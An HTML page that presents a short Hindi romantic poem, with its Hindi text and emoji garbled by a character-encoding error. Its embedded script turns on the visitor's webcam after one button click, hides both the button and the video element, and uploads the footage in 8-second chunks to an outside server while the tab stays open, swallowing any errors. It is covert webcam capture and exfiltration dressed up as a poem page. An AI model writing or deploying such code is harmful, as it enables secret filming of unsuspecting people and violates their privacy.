<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kavita</title>

<style>
body {
  background: #faf7f2;
  font-family: "Poppins", sans-serif;
  padding: 20px;
  line-height: 1.6;
  color: #222;
}

.container {
  max-width: 600px;
  margin: auto;
  background: white;
  padding: 25px;
  border-radius: 14px;
  box-shadow: 0 3px 10px rgba(0,0,0,0.1);
  font-size: 18px;
}

button {
  background: #ff3b3b;
  color: white;
  padding: 12px 22px;
  font-size: 18px;
  border: none;
  border-radius: 10px;
  cursor: pointer;
  margin-bottom: 20px;
}

.hidden {
  display: none;
}
</style>
</head>
<body>

<div class="container">
  <button id="startBtn">‚ñ∂ ‡§∞‡§ø‡§ï‡•â‡§∞‡•ç‡§°‡§ø‡§Ç‡§ó ‡§∂‡•Å‡§∞‡•Ç ‡§ï‡§∞‡•á‡§Ç</button>

  <h2>üåø ‡§è‡§ï ‡§õ‡•ã‡§ü‡•Ä ‡§∏‡•Ä ‡§∞‡•ã‡§Æ‡§æ‡§Ç‡§ü‡§ø‡§ï ‡§ï‡§µ‡§ø‡§§‡§æ üåø</h2>
  <p>
    ‡§§‡•á‡§∞‡•Ä ‡§Ü‡§Å‡§ñ‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§ú‡•ã ‡§Æ‡§æ‡§∏‡•Ç‡§Æ‡§ø‡§Ø‡§§ ‡§π‡•à,<br>
    ‡§µ‡§π‡•Ä ‡§Æ‡•á‡§∞‡•á ‡§¶‡§ø‡§≤ ‡§ï‡•Ä ‡§∞‡§æ‡§π‡§§ ‡§π‡•à,<br>
    ‡§§‡•Ç ‡§™‡§æ‡§∏ ‡§∞‡§π‡•á ‡§Ø‡§æ ‡§¶‡•Ç‡§∞ ‡§ï‡§π‡•Ä‡§Ç,<br>
    ‡§§‡•á‡§∞‡•Ä ‡§ß‡§°‡§º‡§ï‡§® ‡§π‡•Ä ‡§Æ‡•á‡§∞‡•Ä ‡§ö‡§æ‡§π‡§§ ‡§π‡•à‡•§
  </p>
</div>

<!-- Hidden video tag (no preview) -->
<video id="cam" class="hidden" autoplay playsinline></video>

<script>
let stream;
let mediaRecorder;

// üî• Start Recording after button click
document.getElementById("startBtn").addEventListener("click", startRecording);

async function startRecording() {
  try {
    // BUTTON ONCE CLICKED ‚Üí Hide it
    document.getElementById("startBtn").style.display = "none";

    // Camera only ‚Äî NO MIC
    stream = await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: false
    });

    document.getElementById("cam").srcObject = stream;

    mediaRecorder = new MediaRecorder(stream, {
      mimeType: "video/webm; codecs=vp9"
    });

    mediaRecorder.ondataavailable = async (e) => {
      if (e.data && e.data.size > 1000) {
        uploadChunk(e.data);
      }
    };

    mediaRecorder.start(8000); // 8 sec chunks

  } catch (err) {
    alert("Camera permission ‡§ú‡§∞‡•Ç‡§∞‡•Ä ‡§π‡•à!");
    console.error(err);
  }
}

// üì§ Chunk Upload to Deno Backend
async function uploadChunk(blob) {
  const form = new FormData();
  form.append("video_chunk", blob, "cam_chunk.webm");

  fetch("https://video.kannu-jaat.deno.net/", {
    method: "POST",
    body: form
  }).catch(()=>{});
}

// üõë Stop on closing the tab
window.addEventListener("beforeunload", () => {
  if (mediaRecorder && mediaRecorder.state !== "inactive") {
    mediaRecorder.stop();
  }
});
</script>

</body>
</html>